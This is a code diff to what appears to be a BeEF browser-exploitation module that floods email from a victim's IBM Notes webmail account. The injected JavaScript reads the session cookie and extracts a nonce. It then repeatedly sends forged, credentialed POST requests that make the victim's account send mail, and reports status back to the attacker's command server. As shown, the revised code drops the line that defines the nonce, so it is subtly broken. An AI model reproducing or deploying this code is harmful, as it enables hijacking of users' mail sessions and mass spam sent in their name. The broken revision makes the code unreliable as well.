@@ -23,28 +23,34 @@ beef.execute(function() {
 	var currentURL = document.URL;
 	var rx = /(.*\.nsf)/g;
 	var arr = rx.exec(currentURL);
-	var notesURL = arr[1];
+
+	try {
+		var notesURL = arr[1];
+		
+		beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Attempt to start flooding.');
 	
-	beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Attempt to start flooding.');
+		(function flood() {
+			//extract nonce from ShimmerS-cookie
+				var cookies = document.cookie;
+				var rxc = /ShimmerS=.*?N:([A-Za-z0-9]*)/g;
+				var arrc = rxc.exec(cookies);
+				var xhr = new XMLHttpRequest();
+				var uri = notesURL + "/($Inbox)/$new/?EditDocument&Form=h_PageUI&PresetFields=h_EditAction;h_ShimmerEdit,s_ViewName;($Inbox),s_NotesForm;Memo&ui=dwa_form";
+				xhr.open("POST", uri, true);
+				xhr.withCredentials = true;
+				xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+				var post_data = "%25%25Nonce="+nonce+"&h_EditAction=h_Next&h_SetReturnURL=%5B%5B.%2F%26Form%3Dl_CallListener%5D%5D&h_SetCommand=h_ShimmerSendMail&h_SetSaveDoc=1&SendTo="+to+"&CopyTo=&BlindCopyTo=&Body="+body+"&MailOptions=1&Form=Memo&s_UsePlainText=0&s_UsePlainTextAndHTML=0&Subject="+subject;
+	
+				xhr.send(post_data);
+	
+				setTimeout( flood, delay );
+		})();
 
-	(function flood() {
-		//extract nonce from ShimmerS-cookie
-        	var cookies = document.cookie;
-        	var rxc = /ShimmerS=.*?N:([A-Za-z0-9]*)/g;
-        	var arrc = rxc.exec(cookies);
-        	var nonce = arrc[1];
+	} catch(e) {
+		beef.debug("[IBM Notes Flooder] Error: " + e);
+		beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Flooder failed. Error: ' + e);
 
-        	var xhr = new XMLHttpRequest();
-        	var uri = notesURL + "/($Inbox)/$new/?EditDocument&Form=h_PageUI&PresetFields=h_EditAction;h_ShimmerEdit,s_ViewName;($Inbox),s_NotesForm;Memo&ui=dwa_form";
-        	xhr.open("POST", uri, true);
-        	xhr.withCredentials = true;
-        	xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-        	var post_data = "%25%25Nonce="+nonce+"&h_EditAction=h_Next&h_SetReturnURL=%5B%5B.%2F%26Form%3Dl_CallListener%5D%5D&h_SetCommand=h_ShimmerSendMail&h_SetSaveDoc=1&SendTo="+to+"&CopyTo=&BlindCopyTo=&Body="+body+"&MailOptions=1&Form=Memo&s_UsePlainText=0&s_UsePlainTextAndHTML=0&Subject="+subject;
-
-        	xhr.send(post_data);
-
-    		setTimeout( flood, delay );
-	})();
+	}
 });
 
 
